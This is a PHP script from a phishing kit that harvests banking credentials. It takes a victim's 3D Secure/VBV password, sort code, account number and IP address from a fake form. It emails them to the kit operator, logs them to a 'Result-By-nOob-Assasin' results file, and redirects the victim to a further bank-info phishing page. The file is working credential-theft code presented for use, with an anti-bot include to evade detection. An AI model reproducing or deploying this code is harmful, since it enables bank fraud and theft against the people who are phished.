<?php

/*

 */

include 'antibots.php';
include 'config.php';
session_start();


$vbv = $_POST['password_vbv'];
$sort_code = $_POST['sort_code'];
$account_numbervbv = $_POST['account_numbervbv'];
$iP_adress = $_SERVER['REMOTE_ADDR'];
$Info_LOG = "
|---------------- VBV-INFO ---------------|
|3D/VBV           : $vbv
|Sort Code        : $sort_code
|Account Number       : $account_numbervbv
|IP Adresse       : $iP_adress";





// Don't Touche
//Email
if($Send_Email !== 1 ){}else{
    $subject = '♥ VBV INFOS FROM ♥ '.$iP_adress.' ';
    $headers = 'From: XDisDark VBV' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $Info_LOG, $headers);
    header("location:bank_info.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}

//FTP
if($Ftp_Write !== 1 ){}else{
    $file = fopen("rst/Result-By-nOob-Assasin." . $IP_Connected . ".txt", 'a');
    fwrite($file, $Info_LOG);
    header("location:bank_info.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}